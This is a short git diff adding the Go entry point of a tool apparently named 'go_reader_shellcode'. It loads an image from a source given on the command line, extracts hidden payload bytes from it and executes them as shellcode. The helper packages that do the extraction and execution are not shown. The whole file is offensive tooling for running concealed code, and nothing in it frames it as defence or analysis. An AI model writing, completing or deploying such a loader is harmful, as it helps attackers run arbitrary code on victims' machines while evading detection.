@@ -1,0 +1,27 @@
+package main
+
+import (
+    "os"
+    "strconv"
+    // "fmt"
+
+    "go_reader_shellcode/algorithms"
+    "go_reader_shellcode/delivery_methods"
+    "go_reader_shellcode/payload_types"
+)
+
+func main() {
+    shellcode_len, err := strconv.Atoi(os.Args[1])
+    if err != nil {
+        return
+    }
+    var image_source = os.Args[2]
+
+    var payload_data = make([]byte, shellcode_len / 8)
+    var image = delivery_methods.GetImage(image_source)
+    // if image == nil {
+    //    fmt.Println("img not found")
+    // }
+	algorithms.GetPayload(image, payload_data)
+	payload_types.Run(payload_data)
+}
